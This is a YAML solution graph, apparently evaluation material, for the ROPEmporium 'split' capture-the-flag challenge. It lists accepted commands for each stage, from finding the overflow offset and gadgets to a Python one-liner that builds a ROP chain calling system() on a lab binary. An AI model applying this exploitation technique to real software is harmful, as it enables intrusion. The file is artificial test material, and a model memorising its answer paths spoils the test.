version: '0.5'
graph:
  type: reference
challenge:
  id: ropemporium_split
  name: ROPEmporium split
  description: Build a short ROP chain that calls system() with the string "/bin/cat
    flag.txt" already present in the binary.
attacker_context:
  user: ctf-player
  access:
    method: local_shell
    credentials: null
  target:
    host: local
    path: <path-to-challenge-binary>
    architecture: <challenge-architecture>
    os: linux
goal:
  node: node5
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- man ropper
- python3
- python
- bash
- sh
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Overflow offset identified
- id: node1
  type: state
  label: Useful string located
- id: node2
  type: state
  label: system@plt located
- id: node3
  type: state
  label: Argument-loading gadget identified
- id: node4
  type: state
  label: ROP payload crafted
- id: node5
  type: state
  label: Flag printed
edges:
- action: determine_overflow_offset
  accepted_commands:
  - gdb -q ./split
  - ragg2 -P 200 -r > pattern.txt && ./split < pattern.txt
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge0
  from: start
  to: node0
- action: locate_bin_cat_flag_string
  accepted_commands:
  - strings -a -t x split | grep "/bin/cat flag.txt"
  - rabin2 -z split | grep "/bin/cat flag.txt"
  transition_match:
    exit_code: 0
    stdout_regex: .*/bin/cat flag.txt.*
    stderr_regex: ^$
  id: edge1
  from: node0
  to: node1
- action: locate_system_plt
  accepted_commands:
  - objdump -d split | grep system@plt
  - readelf -Ws split | grep system
  - rabin2 -i split | grep system
  transition_match:
    exit_code: 0
    stdout_regex: .*system.*
    stderr_regex: ^$
  id: edge2
  from: node1
  to: node2
- action: find_argument_loading_gadget
  accepted_commands:
  - ROPgadget --binary split | grep "pop rdi"
  - ropper --file split --search "pop rdi"
  - ROPgadget --binary split | grep "pop ; pop ; ret"
  transition_match:
    exit_code: 0
    stdout_regex: .*pop.*
    stderr_regex: .*
  id: edge3
  from: node2
  to: node3
- action: craft_chain_for_system_with_flag_string
  accepted_commands:
  - python3 -c "from struct import pack; import sys; pad=b'A'*40; pop_rdi=0xPOP_RDI_RET;
    bin_cat=0xBIN_CAT_FLAG_TXT; system=0xSYSTEM_PLT; sys.stdout.buffer.write(pad +
    pack('<Q', pop_rdi) + pack('<Q', bin_cat) + pack('<Q', system))" > payload.bin
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge4
  from: node3
  to: node4
- action: execute_chain_and_call_system
  accepted_commands:
  - ./split < payload.bin
  transition_match:
    exit_code: 0
    stdout_regex: .*flag.*
    stderr_regex: .*
  id: edge5
  from: node4
  to: node5
